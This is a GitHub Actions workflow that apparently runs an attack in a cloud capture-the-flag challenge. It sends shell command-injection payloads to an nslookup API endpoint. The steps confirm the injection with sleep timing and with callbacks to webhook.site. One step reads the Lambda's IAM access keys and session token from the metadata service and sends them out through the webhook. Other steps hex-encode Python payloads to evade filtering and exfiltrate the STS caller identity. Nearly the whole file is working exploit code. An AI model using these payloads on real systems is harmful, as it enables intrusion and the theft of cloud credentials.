name: CloudEscape - Webhook Indication
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Test1 - HTTP callback to verify injection executes
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Use a free webhook to verify injection executes
          # webhook.site generates a unique URL, we can check if it received a request
          # First, create a webhook endpoint
          WEBHOOK_URL=$(curl -s https://webhook.site/token 2>&1 | python3 -c "import sys,json; print(json.load(sys.stdin)['uuid'])" 2>&1)
          echo "Webhook UUID: $WEBHOOK_URL"
          echo "Webhook URL: https://webhook.site/$WEBHOOK_URL"
          
          # Inject a curl to the webhook
          PAYLOAD=$(python3 -c "
          import json
          cmd = f'x; curl -s https://webhook.site/$WEBHOOK_URL?test=injection_works 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Sending webhook test ==="
          echo "Payload: $PAYLOAD"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          echo "Waiting 15s..."
          sleep 15
          
          # Check if webhook received anything
          echo "=== Checking webhook ==="
          curl -s "https://webhook.site/$WEBHOOK_URL/requests?sorting newest" 2>&1 | python3 -c "
          import sys, json
          try:
              d = json.load(sys.stdin)
              reqs = d.get('data', [])
              print(f'Total requests received: {len(reqs)}')
              for r in reqs[:5]:
                  print(f'  {r.get(\"created_at\",\"?\")} {r.get(\"query\",{}).get(\"test\",\"\")}')
          except Exception as e:
              print(f'Error: {e}')
          " 2>&1
          
          # Save webhook UUID for other steps
          echo "WEBHOOK_URL=$WEBHOOK_URL" >> $GITHUB_ENV

      - name: Test2 - Webhook with flag content via IMDS
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          WEBHOOK_UUID="${{ env.WEBHOOK_URL }}"
          
          # Inject: get flag from S3 and send to webhook as URL parameter
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; curl -s http://169.254.169.254/latest/meta-data/role/name > /tmp/rn 2>&1; R=$(cat /tmp/rn); curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$R > /tmp/rc 2>&1; /var/lang/bin/python3 -c \"import json; c=json.load(open('/tmp/rc')); print(c['AccessKeyId']+\":\"+c['SecretAccessKey']+\":\"+c['Token'])\" > /tmp/creds 2>&1; curl -s https://webhook.site/$WEBHOOK_UUID?creds=$(cat /tmp/creds 2>/dev/null | head -c 200) 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Sending IMDS + webhook ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 15
          
          echo "=== Checking webhook ==="
          curl -s "https://webhook.site/$WEBHOOK_UUID/requests?sorting=newest" 2>&1 | python3 -c "
          import sys, json
          d = json.load(sys.stdin)
          reqs = d.get('data', [])
          print(f'Requests: {len(reqs)}')
          for r in reqs[:5]:
              print(f'  query: {r.get(\"query\",{})}')
              print(f'  url: {r.get(\"url\",\"\")}')
          " 2>&1 || true

      - name: Test3 - Timing-based oracle (does injection add delay?)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Measure normal response time (no injection)
          echo "=== Normal request (no injection) ==="
          time curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "127.0.0.1"}' 2>&1
          echo
          
          # Measure with sleep 5 (if injection works, response should be ~5s slower)
          echo "=== With sleep 5 ==="
          time curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "127.0.0.1; sleep 5"}' 2>&1
          echo
          
          # Measure with sleep 10
          echo "=== With sleep 10 ==="
          time curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "127.0.0.1; sleep 10"}' 2>&1
          echo
          
          # Measure with sleep 14 (just under 15s timeout)
          echo "=== With sleep 14 ==="
          time curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "127.0.0.1; sleep 14"}' 2>&1
          echo

      - name: Test4 - webhook via printf-hex python (proper execution)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          WEBHOOK_UUID="${{ env.WEBHOOK_URL }}"
          
          PAYLOAD=$(python3 << PYEOF
          import json
          s = "import urllib.request\n"
          s += "urllib.request.urlopen('https://webhook.site/$WEBHOOK_UUID?test=python_works')\n"
          h = ''.join(f'\\x{ord(c):02x}' for c in s)
          cmd = f'127.0.0.1; printf "{h}" > /tmp/w.py; /var/lang/bin/python3 /tmp/w.py 2>&1'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test4: webhook via printf-hex python ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 15
          
          echo "=== Checking webhook ==="
          curl -s "https://webhook.site/$WEBHOOK_UUID/requests?sorting=newest" 2>&1 | python3 -c "
          import sys, json
          d = json.load(sys.stdin)
          reqs = d.get('data', [])
          print(f'Total requests: {len(reqs)}')
          for r in reqs[:10]:
              print(f'  {r.get(\"created_at\",\"?\")} query={r.get(\"query\",{})}')
          " 2>&1 || true

      - name: Test5 - webhook via python -c (single quotes, no nested quotes)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          WEBHOOK_UUID="${{ env.WEBHOOK_URL }}"
          
          # Use python3 -c with NO quotes inside the Python code
          # Use urllib import and call
          PAYLOAD=$(python3 << PYEOF
          import json
          cmd = f"127.0.0.1; /var/lang/bin/python3 -c 'import urllib.request;urllib.request.urlopen(\"https://webhook.site/$WEBHOOK_UUID?test=py2\")' 2>&1"
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test5: python -c webhook ==="
          echo "Payload: $PAYLOAD"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          
          echo "=== Checking webhook ==="
          curl -s "https://webhook.site/$WEBHOOK_UUID/requests?sorting=newest" 2>&1 | python3 -c "
          import sys, json
          d = json.load(sys.stdin)
          reqs = d.get('data', [])
          print(f'Total: {len(reqs)}')
          for r in reqs[:10]:
              print(f'  q={r.get(\"query\",{})}')
          " 2>&1 || true

      - name: Test6 - webhook via /opt/bin/aws sts get-caller-identity
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          WEBHOOK_UUID="${{ env.WEBHOOK_URL }}"
          
          # Use /opt/bin/aws sts get-caller-identity to get Lambda role identity
          # Then send to webhook
          PAYLOAD=$(python3 << PYEOF
          import json
          cmd = f"127.0.0.1; /opt/bin/aws sts get-caller-identity --region us-east-1 > /tmp/id 2>&1; curl -s https://webhook.site/$WEBHOOK_UUID?id=$(cat /tmp/id | head -c 200) 2>&1"
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test6: sts identity -> webhook ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          
          echo "=== Checking webhook ==="
          curl -s "https://webhook.site/$WEBHOOK_UUID/requests?sorting=newest" 2>&1 | python3 -c "
          import sys, json
          d = json.load(sys.stdin)
          reqs = d.get('data', [])
          print(f'Total: {len(reqs)}')
          for r in reqs[:10]:
              print(f'  q={r.get(\"query\",{})}')
          " 2>&1 || true

      - name: Final - Webhook summary
        if: always()
        run: |
          WEBHOOK_UUID="${{ env.WEBHOOK_URL }}"
          echo "Webhook UUID: $WEBHOOK_UUID"
          echo "Webhook URL: https://webhook.site/$WEBHOOK_UUID"
          
          echo "=== ALL webhook requests ==="
          curl -s "https://webhook.site/$WEBHOOK_UUID/requests?sorting=newest&per_page=50" 2>&1 | python3 -c "
          import sys, json
          try:
              d = json.load(sys.stdin)
              reqs = d.get('data', [])
              print(f'Total requests received: {len(reqs)}')
              for r in reqs:
                  print(f'  {r.get(\"created_at\",\"?\")} query={r.get(\"query\",{})} url={r.get(\"url\",\"\")[:100]}')
          except Exception as e:
              print(f'Error: {e}')
          " 2>&1 || true